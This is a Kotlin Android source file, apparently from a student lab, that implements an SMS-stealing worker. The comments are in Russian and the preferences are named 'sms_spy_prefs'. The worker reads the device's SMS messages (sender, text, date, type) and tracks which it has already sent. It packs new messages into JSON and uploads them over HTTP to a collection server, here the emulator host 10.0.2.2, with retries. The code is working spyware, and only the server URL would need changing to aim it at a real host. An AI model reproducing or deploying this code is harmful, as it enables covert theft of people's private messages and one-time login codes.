package com.example.lab2
import android.content.Context
import android.provider.Telephony
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

class SmsWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    companion object {
        private const val TAG = "SMS_WORKER_TAG"

        // localhost хост-машины из эмулятора.
        private const val SERVER_URL = "http://10.0.2.2:5000/sms"

        // Ключ для SharedPreferences, где храним id последнего отправленного SMS
        private const val PREFS = "sms_spy_prefs"
        private const val KEY_LAST_ID = "last_sms_id"
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    override suspend fun doWork(): Result {
        return try {
            val newSms = withContext(Dispatchers.IO) { readNewSms() }
            if (newSms.isEmpty()) {
                Log.d(TAG, "Нет новых SMS для отправки")
                return Result.success()
            }

            val json = buildJson(newSms)
            Log.d(TAG, "Отправляю ${newSms.size} SMS: $json")

            val success = withContext(Dispatchers.IO) { upload(json) }
            if (success) {
                saveLastId(newSms.maxOf { it.id })
                Log.d(TAG, "Отправка успешна")
                Result.success()
            } else {
                Log.w(TAG, "Сервер вернул ошибку, повтор")
                Result.retry()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Ошибка воркера", e)
            Result.retry()
        }
    }

    // ---------- Чтение SMS ----------

    private fun readNewSms(): List<SmsData> {
        val result = mutableListOf<SmsData>()
        val lastId = getLastId()

        val cursor = applicationContext.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            ),
            "${Telephony.Sms._ID} > ?",
            arrayOf(lastId.toString()),
            "${Telephony.Sms._ID} ASC"
        )

        cursor?.use {
            val idxId = it.getColumnIndexOrThrow(Telephony.Sms._ID)
            val idxAddr = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
            val idxBody = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
            val idxDate = it.getColumnIndexOrThrow(Telephony.Sms.DATE)
            val idxType = it.getColumnIndexOrThrow(Telephony.Sms.TYPE)

            while (it.moveToNext()) {
                result.add(
                    SmsData(
                        id = it.getLong(idxId),
                        address = it.getString(idxAddr) ?: "",
                        body = it.getString(idxBody) ?: "",
                        date = it.getLong(idxDate),
                        type = it.getInt(idxType)
                    )
                )
            }
        }
        return result
    }

    private fun getLastId(): Long =
        applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getLong(KEY_LAST_ID, 0L)

    private fun saveLastId(id: Long) {
        applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .putLong(KEY_LAST_ID, id)
            .apply()
    }

    // ---------- Формирование JSON ----------

    private fun buildJson(list: List<SmsData>): String {
        val df = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        val root = JSONObject()
        root.put("device_time", df.format(Date()))

        val arr = JSONArray()
        for (s in list) {
            val o = JSONObject()
            o.put("id", s.id)
            o.put("address", s.address)
            o.put("body", s.body)
            o.put("date", df.format(Date(s.date)))
            // вместо числа — читаемый тип
            o.put("type", typeToString(s.type))
            arr.put(o)
        }
        root.put("messages", arr)
        return root.toString()
    }

    private fun typeToString(type: Int): String = when (type) {
        Telephony.Sms.MESSAGE_TYPE_INBOX   -> "INBOX"
        Telephony.Sms.MESSAGE_TYPE_SENT    -> "SENT"
        Telephony.Sms.MESSAGE_TYPE_DRAFT   -> "DRAFT"
        Telephony.Sms.MESSAGE_TYPE_OUTBOX  -> "OUTBOX"
        Telephony.Sms.MESSAGE_TYPE_FAILED  -> "FAILED"
        Telephony.Sms.MESSAGE_TYPE_QUEUED  -> "QUEUED"
        else -> "UNKNOWN($type)"
    }

    // ---------- Отправка на сервер ----------

    private fun upload(json: String): Boolean {
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = json.toRequestBody(mediaType)

        val request = Request.Builder()
            .url(SERVER_URL)
            .post(body)
            .addHeader("Content-Type", "application/json")
            .build()

        client.newCall(request).execute().use { response ->
            Log.d(TAG, "HTTP ${response.code}")
            return response.isSuccessful
        }
    }

    data class SmsData(
        val id: Long,
        val address: String,
        val body: String,
        val date: Long,
        val type: Int
    )
}